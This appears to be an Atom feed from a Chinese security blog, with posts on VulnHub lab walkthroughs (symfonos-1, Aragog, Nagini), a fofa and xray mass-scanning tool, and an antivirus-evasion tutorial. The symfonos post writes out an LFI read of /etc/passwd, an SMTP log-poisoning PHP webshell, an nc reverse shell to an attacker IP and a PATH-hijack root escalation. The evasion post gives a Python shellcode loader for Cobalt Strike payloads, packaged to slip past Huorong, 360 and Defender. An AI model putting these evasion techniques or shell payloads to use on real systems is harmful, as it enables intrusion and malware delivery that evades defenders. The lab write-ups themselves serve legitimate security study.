<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Syst1m</title>
  
  
  <link href="https://syst1m.top/atom.xml" rel="self"/>
  
  <link href="https://syst1m.top/"/>
  <updated>2022-12-05T07:59:55.916Z</updated>
  <id>https://syst1m.top/</id>
  
  <author>
    <name>Syst1m</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>symfonos系列打靶-1</title>
    <link href="https://syst1m.top/2022/12/05/symfonos%E7%B3%BB%E5%88%97%E6%89%93%E9%9D%B6-1/"/>
    <id>https://syst1m.top/2022/12/05/symfonos%E7%B3%BB%E5%88%97%E6%89%93%E9%9D%B6-1/</id>
    <published>2022-12-05T06:27:35.000Z</published>
    <updated>2022-12-05T07:59:55.916Z</updated>
    
    <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>靶机地址 <a href="https://www.vulnhub.com/entry/symfonos-1,322/">https://www.vulnhub.com/entry/symfonos-1,322/</a></p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>探测存活ip</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212051434477.png"></p><p>对靶机进行详细扫描</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212051435562.png"></p><p>开放了smb服务,跑一下smb服务探测工具</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">enum4linux 192.168.31.217</span><br></pre></td></tr></table></figure><p>扫出一个anonymous可访问</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212051439999.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">smbclient //192.168.31.217/anonymous -U % N</span><br><span class="line">这里 -U 表示用户名，% 表示用户名。</span><br><span class="line">参数 -N 用于空密码</span><br></pre></td></tr></table></figure><p>发现一个txt文件,下载下来看看</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212051441152.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212051441146.png"></p><p>提示密码是这三个,结合上面smb信息收集的时候存在一个要密码的目录,爆破试试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">smbclient //192.168.31.217/helios -U helios</span><br><span class="line">密码为 qwerty</span><br></pre></td></tr></table></figure><p>存在两个txt文件,下载下来</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212051447053.png"></p><p>提示里似乎是一个目录</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212051448292.png"></p><p>访问网站首页看看这个路径,成功跳转,但是有的css文件没加载出来,看到请求网址,修改host解析</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212051450223.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;192.168.31.217 symfonos.local&quot;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure><h1 id="web打点"><a href="#web打点" class="headerlink" title="web打点"></a>web打点</h1><p>WordPress,直接掏出wpscan,wpscan扫描漏洞需要token</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://symfonos.local/h3l105/ -e p --api-token xxxxxxx你的apitokenxxxx</span><br></pre></td></tr></table></figure><p>扫出漏洞大多是xss,没什么用,但是存在一个文件包含</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212051509667.png"></p><p>可以读文件,那么可以尝试密码找回,再去重置密码,账号为admin</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212051520097.png"></p><p>读取邮件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212051520350.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212051520093.png"></p><p>但是进入后台拿shell无果,尝试使用SMTP日志投毒配合LFI来进行RCE</p><h2 id="SMTP日志投毒RCE"><a href="#SMTP日志投毒RCE" class="headerlink" title="SMTP日志投毒RCE"></a>SMTP日志投毒RCE</h2><p>写入webshell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">telnet 192.168.31.217 25</span><br><span class="line">MAIL FROM: &lt;<span class="built_in">test</span>&gt;</span><br><span class="line">RCPT TO: Helios</span><br><span class="line">data</span><br><span class="line">&lt;?php system(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);?&gt;</span><br><span class="line">.</span><br><span class="line">quit</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212051526411.png"></p><p>配合文件包含来rce,访问</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&amp;a=ip a </span><br></pre></td></tr></table></figure><p>成功执行命令</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212051528782.png"></p><p>kali监听,访问</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&amp;a=nc -nv 192.168.31.118 4444 -e /bin/bash</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212051530816.png"></p><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>python返回一个半交互式shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure><p>linux提权,suid sudo 内核</p><p>存在不常见suid文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212051533457.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212051534603.png"></p><p>用file命令查看文件类型</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212051537986.png"></p><p>用strings打印一下他干了什么</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212051540193.png"></p><p>似乎是一个发包器,用curl -I <a href="http://localhost/">http://localhost</a> 访问本地</p><p>这样的话,我们可以自定义一个curl文件,顶替掉原来的curl命令,用来反弹一个root权限的shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line"><span class="built_in">echo</span> $<span class="string">&#x27;#!/bin/sh\n/bin/sh&#x27;</span> &gt; curl <span class="comment">#写入反弹一个shell</span></span><br><span class="line"><span class="built_in">chmod</span> +x curl</span><br><span class="line"><span class="built_in">export</span> PATH=$(<span class="built_in">pwd</span>):<span class="variable">$PATH</span> <span class="comment">#构造临时环境变量,让statuscheck文件去执行我们创建的curl</span></span><br><span class="line">/opt/statuscheck</span><br><span class="line"><span class="built_in">whoami</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212051554243.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212051556179.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;环境&quot;&gt;&lt;a href=&quot;#环境&quot; class=&quot;headerlink&quot; title=&quot;环境&quot;&gt;&lt;/a&gt;环境&lt;/h1&gt;&lt;p&gt;靶机地址 &lt;a href=&quot;https://www.vulnhub.com/entry/symfonos-1,322/&quot;&gt;https://www.vulnhub.com/entry/symfonos-1,322/&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerlink&quot; title=&quot;信息收集&quot;&gt;&lt;/a&gt;信息收集&lt;/h1&gt;&lt;p&gt;探测存活ip&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202212051434477.png&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="打靶" scheme="https://syst1m.top/categories/%E6%89%93%E9%9D%B6/"/>
    
    
    <category term="smb信息收集" scheme="https://syst1m.top/tags/smb%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
    <category term="wordpress" scheme="https://syst1m.top/tags/wordpress/"/>
    
  </entry>
  
  <entry>
    <title>python免杀bypass x绒 x60 defender</title>
    <link href="https://syst1m.top/2022/12/04/python%E5%85%8D%E6%9D%80bypass-x%E7%BB%92-x60-defender/"/>
    <id>https://syst1m.top/2022/12/04/python%E5%85%8D%E6%9D%80bypass-x%E7%BB%92-x60-defender/</id>
    <published>2022-12-04T09:29:37.000Z</published>
    <updated>2022-12-04T10:30:54.985Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近学习免杀技术,偶然尝试居然bypass 国内常用杀软,很简单,但却非常使用,效果好到惊呆</p><h1 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h1><h2 id="生成payload"><a href="#生成payload" class="headerlink" title="生成payload"></a>生成payload</h2><p>cs生成一个python的pyload</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212041732758.png"></p><h2 id="构造加载器"><a href="#构造加载器" class="headerlink" title="构造加载器"></a>构造加载器</h2><p>加载器都一样,大同小异,网上很多</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># shellcode loader</span></span><br><span class="line"><span class="comment"># 返回新字节数组</span></span><br><span class="line">shellcode = <span class="built_in">bytearray</span>(shellcode)</span><br><span class="line"><span class="comment"># 设置VirtualAlloc返回类型为ctypes.c_uint64</span></span><br><span class="line">ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64</span><br><span class="line"><span class="comment"># 申请内存</span></span><br><span class="line">ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(<span class="number">0</span>), ctypes.c_int(<span class="built_in">len</span>(shellcode)), ctypes.c_int(<span class="number">0x3000</span>),ctypes.c_int(<span class="number">0x40</span>))</span><br><span class="line"><span class="comment"># 放入shellcode</span></span><br><span class="line">buf = (ctypes.c_char * <span class="built_in">len</span>(shellcode)).from_buffer(shellcode)</span><br><span class="line">ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(ptr), buf, ctypes.c_int(<span class="built_in">len</span>(shellcode)))</span><br><span class="line"><span class="comment"># 创建一个线程从shellcode防止位置首地址开始执行</span></span><br><span class="line">handle = ctypes.windll.kernel32.CreateThread(ctypes.c_int(<span class="number">0</span>),ctypes.c_int(<span class="number">0</span>),ctypes.c_uint64(ptr),ctypes.c_int(<span class="number">0</span>),ctypes.c_int(<span class="number">0</span>),ctypes.pointer(ctypes.c_int(<span class="number">0</span>)))</span><br><span class="line"><span class="comment"># 等待上面创建的线程运行完</span></span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle), ctypes.c_int(-<span class="number">1</span>))</span><br></pre></td></tr></table></figure><h1 id="免杀开始"><a href="#免杀开始" class="headerlink" title="免杀开始"></a>免杀开始</h1><p>将生成的pyload中的shellcode取出来放进加载器</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">shellcode = <span class="string">b&quot;\xfc\x48\x83\xe4\xf0...&quot;</span></span><br><span class="line">    <span class="comment"># shellcode loader代码</span></span><br><span class="line">    <span class="comment"># 返回新字节数组</span></span><br><span class="line">    shellcode = <span class="built_in">bytearray</span>(shellcode)</span><br><span class="line">    <span class="comment"># 设置VirtualAlloc返回类型为ctypes.c_uint64</span></span><br><span class="line">    ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64</span><br><span class="line">    <span class="comment"># 申请内存</span></span><br><span class="line">    ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(<span class="number">0</span>), ctypes.c_int(<span class="built_in">len</span>(shellcode)), ctypes.c_int(<span class="number">0x3000</span>),ctypes.c_int(<span class="number">0x40</span>))</span><br><span class="line">    <span class="comment"># 放入shellcode</span></span><br><span class="line">    buf = (ctypes.c_char * <span class="built_in">len</span>(shellcode)).from_buffer(shellcode)</span><br><span class="line">    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(ptr), buf, ctypes.c_int(<span class="built_in">len</span>(shellcode)))</span><br><span class="line">    <span class="comment"># 创建一个线程从shellcode防止位置首地址开始执行</span></span><br><span class="line">    handle = ctypes.windll.kernel32.CreateThread(ctypes.c_int(<span class="number">0</span>),ctypes.c_int(<span class="number">0</span>),ctypes.c_uint64(ptr),ctypes.c_int(<span class="number">0</span>),ctypes.c_int(<span class="number">0</span>),ctypes.pointer(ctypes.c_int(<span class="number">0</span>)))</span><br><span class="line">    <span class="comment"># 等待上面创建的线程运行完</span></span><br><span class="line">    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle), ctypes.c_int(-<span class="number">1</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看到并没有对加载器进行任何处理,这样打包出来毫无疑问是会被杀的</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212041741147.png"></p><h2 id="import混淆加密打包bypass"><a href="#import混淆加密打包bypass" class="headerlink" title="import混淆加密打包bypass"></a>import混淆加密打包bypass</h2><p>现在我们把加载器写成一个函数,再通过一个py文件去调用加载器</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> shellcodloader</span><br><span class="line">shellcodloader.main()</span><br></pre></td></tr></table></figure><p>最终目录如下:</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212041744127.png"></p><p>然后使用pyinstaller开始打包 –key 对二进制文件进行加密,防止反编译</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pyinstaller -F main.py --key <span class="built_in">test</span></span><br></pre></td></tr></table></figure><h2 id="x绒"><a href="#x绒" class="headerlink" title="x绒"></a>x绒</h2><p>可以看到我们没有对加载器做任何免杀操作,但是依旧免杀,简单实用.测试时间2022.12.4</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212041749331.png"></p><h2 id="x60-核晶开启"><a href="#x60-核晶开启" class="headerlink" title="x60 核晶开启"></a>x60 核晶开启</h2><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212041750463.png"></p><h2 id="defender"><a href="#defender" class="headerlink" title="defender"></a>defender</h2><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212041751616.png"></p><h1 id="cs执行命令"><a href="#cs执行命令" class="headerlink" title="cs执行命令"></a>cs执行命令</h1><p>以上都可以正常上线cs并执行命令</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212041751869.png"></p><h1 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h1><p><a href="https://github.com/chencicici/python_bypass">https://github.com/chencicici/python_bypass</a></p><h1 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h1><p>并没有上传微步和vt,因为已经够用了.以上仅仅使用import混淆导包和pyinstaller加密生成exe,还没有对shellcode和加载器进行加密混淆,已经免杀国内常用杀软.后续对shellcode进行加密或者分离加载,效果只会更好</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;最近学习免杀技术,偶然尝试居然bypass 国内常用杀软,很简单,但却非常使用,效果好到惊呆&lt;/p&gt;
&lt;h1 id=&quot;准备&quot;&gt;&lt;a href=&quot;#准备&quot; class=&quot;headerlink&quot; title=&quot;准备&quot;&gt;&lt;/a&gt;准备&lt;/h1&gt;&lt;h2 id=&quot;生成payload&quot;&gt;&lt;a href=&quot;#生成payload&quot; class=&quot;headerlink&quot; title=&quot;生成payload&quot;&gt;&lt;/a&gt;生成payload&lt;/h2&gt;&lt;p&gt;cs生成一个python的pyload&lt;/p&gt;</summary>
    
    
    
    <category term="造轮子" scheme="https://syst1m.top/categories/%E9%80%A0%E8%BD%AE%E5%AD%90/"/>
    
    
    <category term="免杀" scheme="https://syst1m.top/tags/%E5%85%8D%E6%9D%80/"/>
    
    <category term="bypass" scheme="https://syst1m.top/tags/bypass/"/>
    
  </entry>
  
  <entry>
    <title>Auto_xray批量缝合怪</title>
    <link href="https://syst1m.top/2022/11/22/Auto-xray/"/>
    <id>https://syst1m.top/2022/11/22/Auto-xray/</id>
    <published>2022-11-22T07:49:57.000Z</published>
    <updated>2022-11-22T07:52:35.310Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Auto-xray"><a href="#Auto-xray" class="headerlink" title="Auto_xray"></a>Auto_xray</h1><p><strong>工具仅供授权状态下使用,如发生刑事案件,非授权攻击行为于本人无关.望大家熟知《网络安全法》</strong></p><p>因为懒所以写了一个菜鸡缝合怪,缝合fofa xray<br>和fofa2xray差不多,但是我自己在mac端使用fofa2xray体验不是很好,mac端也调用cmd -c,应该是作者调试的时候忘记改了,同时挂服务器上经常跑着跑着就卡住了没反应,不知道是不是我没配置好,索性自己造了个轮子</p><h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><p>自带mac版的xray1.9.3,其他系统自行替换</p><p>建议部署在linux上,因为windows上的路径文件名和编码可能会导致文件保存出错或者出现乱码</p><p>支持直接使用xray多线程批量扫描指定url列表文件和fofa语法寻找目标扫描需要配置fofa.py中的邮箱 key 搜索语法<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202210262249314.png"></p><p>扫描完成后邮件提醒.需要配置my_email.py中的邮件地址和key<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202210262250753.png"></p><h2 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h2><p>直接扫描url列表</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 Auto_xray -t 5 指定线程,默认10 -f urls.txt路径 -e True 开启邮件推送</span><br></pre></td></tr></table></figure><h2 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h2><p>使用fofa批量抓取目标</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 Auto_xray -t 5 指定线程,默认10 -f urls.txt路径 -e True 开启邮件推送 -ff True 开启fofa批量</span><br></pre></td></tr></table></figure><h2 id="3"><a href="#3" class="headerlink" title="3."></a>3.</h2><p>部署到后台持久化</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo <span class="built_in">nohup</span> python3 ./Auto_xray.py  -e True  -ff True &amp;  </span><br></pre></td></tr></table></figure><p>更多详细参数 –help<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202210262248211.png"></p><p>一些默认配置可以修改<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202210262341074.png"></p><p>项目地址:<a href="https://github.com/chencicici/Auto_xray">https://github.com/chencicici/Auto_xray</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Auto-xray&quot;&gt;&lt;a href=&quot;#Auto-xray&quot; class=&quot;headerlink&quot; title=&quot;Auto_xray&quot;&gt;&lt;/a&gt;Auto_xray&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;工具仅供授权状态下使用,如发生刑事案件,非授权攻击行为于本人无关.望大家熟知《网络安全法》&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;因为懒所以写了一个菜鸡缝合怪,缝合fofa xray&lt;br&gt;和fofa2xray差不多,但是我自己在mac端使用fofa2xray体验不是很好,mac端也调用cmd -c,应该是作者调试的时候忘记改了,同时挂服务器上经常跑着跑着就卡住了没反应,不知道是不是我没配置好,索性自己造了个轮子&lt;/p&gt;
&lt;h1 id=&quot;使用&quot;&gt;&lt;a href=&quot;#使用&quot; class=&quot;headerlink&quot; title=&quot;使用&quot;&gt;&lt;/a&gt;使用&lt;/h1&gt;&lt;p&gt;自带mac版的xray1.9.3,其他系统自行替换&lt;/p&gt;</summary>
    
    
    
    <category term="造轮子" scheme="https://syst1m.top/categories/%E9%80%A0%E8%BD%AE%E5%AD%90/"/>
    
    
    <category term="fofa" scheme="https://syst1m.top/tags/fofa/"/>
    
    <category term="xray" scheme="https://syst1m.top/tags/xray/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub-Aragog打靶</title>
    <link href="https://syst1m.top/2022/11/14/vulnhub-Aragog%E6%89%93%E9%9D%B6/"/>
    <id>https://syst1m.top/2022/11/14/vulnhub-Aragog%E6%89%93%E9%9D%B6/</id>
    <published>2022-11-14T11:00:32.000Z</published>
    <updated>2022-11-15T07:12:24.558Z</updated>
    
    <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>靶机 <a href="https://www.vulnhub.com/entry/harrypotter-aragog-102,688/">https://www.vulnhub.com/entry/harrypotter-aragog-102,688/</a></p><p>靶机ip:192.168.31.199</p><p>攻击机kali:192.168.31.118</p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211141905769.png"></p><p>首页没什么东西,先扫一下目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gobuster <span class="built_in">dir</span> -r -u http://192.168.31.199 -x txt,html,php -w /usr/share/seclists/Discovery/Web-Content/common.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211141907897.png"></p><p>访问blog目录,发现是wordparess</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211141908882.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211141923604.png"></p><p>点击notice,发现跳转到一个域名</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211141924265.png"></p><p>修改hosts解析,成功跳转,页面正常</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211141925408.png"></p><p>用wpscan扫一下,需要token才扫得出漏洞,使用–plugins-detection aggressive 参数,不然那有的漏洞扫不出来</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://wordpress.aragog.hogwarts/blog -e p --plugins-detection aggressive --api-token token</span><br></pre></td></tr></table></figure><p>扫出一个插件有rce</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211142320912.png"></p><h1 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h1><p>msf找一下exp</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211142324683.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211151401988.png"></p><p>成功反弹会话</p><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>反弹一个半交互式shell,找到一个base64编码的字符串,没啥用</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211151408585.png"></p><p>尝试suid 和sudo提权无果,发现进程里有mysql</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211151414932.png"></p><p>在&#x2F;etc&#x2F;wordpress下找到root密码</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211151418825.png"></p><p>登录mysql找到一条登录记录 hagrid98 password123</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211151434272.png"></p><p>ssh成功登录</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211151438142.png"></p><p>发现一个隐藏文件,应该是用来备份文件的,一般都是定时任务</p><p>写入反弹shell命令</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211151457383.png"></p><p>等待一会,反弹shell</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211151458157.png"></p><p>发现确实是root的定时任务</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211151500562.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;环境&quot;&gt;&lt;a href=&quot;#环境&quot; class=&quot;headerlink&quot; title=&quot;环境&quot;&gt;&lt;/a&gt;环境&lt;/h1&gt;&lt;p&gt;靶机 &lt;a href=&quot;https://www.vulnhub.com/entry/harrypotter-aragog-102,688/&quot;&gt;https://www.vulnhub.com/entry/harrypotter-aragog-102,688/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;靶机ip:192.168.31.199&lt;/p&gt;
&lt;p&gt;攻击机kali:192.168.31.118&lt;/p&gt;
&lt;h1 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerlink&quot; title=&quot;信息收集&quot;&gt;&lt;/a&gt;信息收集&lt;/h1&gt;</summary>
    
    
    
    <category term="打靶" scheme="https://syst1m.top/categories/%E6%89%93%E9%9D%B6/"/>
    
    
    <category term="vulnhub" scheme="https://syst1m.top/tags/vulnhub/"/>
    
    <category term="HARRYPOTTER系列" scheme="https://syst1m.top/tags/HARRYPOTTER%E7%B3%BB%E5%88%97/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub-Nagini打靶</title>
    <link href="https://syst1m.top/2022/11/10/vulnhub-Nagini%E6%89%93%E9%9D%B6/"/>
    <id>https://syst1m.top/2022/11/10/vulnhub-Nagini%E6%89%93%E9%9D%B6/</id>
    <published>2022-11-10T10:09:44.000Z</published>
    <updated>2022-11-14T11:02:02.017Z</updated>
    
    <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>vulnhub靶场 <a href="https://www.vulnhub.com/entry/harrypotter-nagini,689/">https://www.vulnhub.com/entry/harrypotter-nagini,689/</a></p><p>攻击机kali：192,168.1.11</p><p>靶机：192.168.1.12</p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>对靶机进行端口扫描</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211101831531.png"></p><p>看看首页只有一张图，扫一下目录</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211101833971.png"></p><p>Joomla cms</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211101834687.png"></p><p>进一步扫目录，扫到一个备份文件,去掉后缀.bak直接打开</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211101843025.png"></p><p>找到数据库配置，但是没用，数据库不允许外链</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211101853030.png"></p><p>线索似乎到这里就断了，没有能利用的地方，msf扫了下cms版本也很高不存在nday，继续信息收集，换个字典用gobuster重新扫目录(换了网络,所以ip变了)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster <span class="built_in">dir</span> -r -u http://192.168.31.205 -x txt,html,php -w /usr/share/seclists/Discovery/Web-Content/common.txt</span><br></pre></td></tr></table></figure><p>扫出一个新的txt文件</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211111409457.png"></p><p>翻译为中文,提示我们需要使用http3去访问这个域名</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211111415527.png"></p><p>用docker起了一个http3容器,拿到提示,说访问这个目录</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211111506046.png"></p><p>访问发现</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211111508939.png"></p><h1 id="ssrf打mysql未授权"><a href="#ssrf打mysql未授权" class="headerlink" 